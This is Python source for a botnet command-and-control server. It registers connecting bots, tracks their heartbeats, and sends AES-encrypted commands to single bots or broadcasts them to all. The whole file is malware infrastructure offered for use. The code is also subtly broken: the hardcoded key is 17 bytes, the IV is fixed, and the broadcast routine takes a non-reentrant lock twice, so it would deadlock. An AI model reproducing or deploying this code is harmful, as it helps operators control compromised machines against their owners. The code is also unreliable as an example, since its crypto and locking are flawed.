import socket
import threading
import json
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import base64
import hashlib
import time

# Configuration
SERVER_HOST = '0.0.0.0'
SERVER_PORT = 5555
SECRET_KEY = b'mysecretkey123456'  # In practice, use proper key management
IV = b'initialvector123'  # Should be random in production

class BotnetServer:
    def __init__(self):
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.bots = {}  # {bot_id: {'socket': socket_obj, 'address': (ip, port)}}
        self.lock = threading.Lock()
        self.running = True

    def encrypt(self, plaintext):
        cipher = AES.new(SECRET_KEY, AES.MODE_CBC, IV)
        padded_text = pad(plaintext.encode(), AES.block_size)
        encrypted = cipher.encrypt(padded_text)
        return base64.b64encode(encrypted).decode()

    def decrypt(self, ciphertext):
        cipher = AES.new(SECRET_KEY, AES.MODE_CBC, IV)
        decoded = base64.b64decode(ciphertext.encode())
        decrypted = cipher.decrypt(decoded)
        return unpad(decrypted, AES.block_size).decode()

    def handle_bot(self, bot_socket, bot_address):
        try:
            bot_id = None
            while self.running:
                data = bot_socket.recv(4096)
                if not data:
                    break

                try:
                    decrypted = self.decrypt(data.decode())
                    message = json.loads(decrypted)

                    if message['type'] == 'register':
                        bot_id = message['bot_id']
                        with self.lock:
                            self.bots[bot_id] = {
                                'socket': bot_socket,
                                'address': bot_address,
                                'last_seen': time.time()
                            }
                        print(f"[+] Bot registered: {bot_id} from {bot_address}")

                    elif message['type'] == 'heartbeat':
                        with self.lock:
                            if bot_id in self.bots:
                                self.bots[bot_id]['last_seen'] = time.time()

                    elif message['type'] == 'response':
                        print(f"[*] Response from {bot_id}: {message['data']}")

                except Exception as e:
                    print(f"[-] Error processing message: {e}")
                    continue

        except Exception as e:
            print(f"[-] Connection error with bot: {e}")
        finally:
            if bot_id:
                with self.lock:
                    if bot_id in self.bots:
                        del self.bots[bot_id]
                print(f"[-] Bot disconnected: {bot_id}")
            bot_socket.close()

    def send_command(self, bot_id, command):
        with self.lock:
            if bot_id not in self.bots:
                print(f"[-] Bot {bot_id} not found")
                return False

            try:
                message = json.dumps({
                    'type': 'command',
                    'command': command
                })
                encrypted = self.encrypt(message)
                self.bots[bot_id]['socket'].send(encrypted.encode())
                return True
            except Exception as e:
                print(f"[-] Error sending command to {bot_id}: {e}")
                return False

    def broadcast_command(self, command):
        with self.lock:
            success_count = 0
            for bot_id in list(self.bots.keys()):
                if self.send_command(bot_id, command):
                    success_count += 1
            return success_count

    def start(self):
        self.server_socket.bind((SERVER_HOST, SERVER_PORT))
        self.server_socket.listen(5)
        print(f"[*] C&C server listening on {SERVER_HOST}:{SERVER_PORT}")

        try:
            while self.running:
                bot_socket, bot_address = self.server_socket.accept()
                client_thread = threading.Thread(
                    target=self.handle_bot,
                    args=(bot_socket, bot_address)
                )
                client_thread.daemon = True
                client_thread.start()
        except KeyboardInterrupt:
            print("\n[*] Shutting down server...")
            self.running = False
            self.server_socket.close()

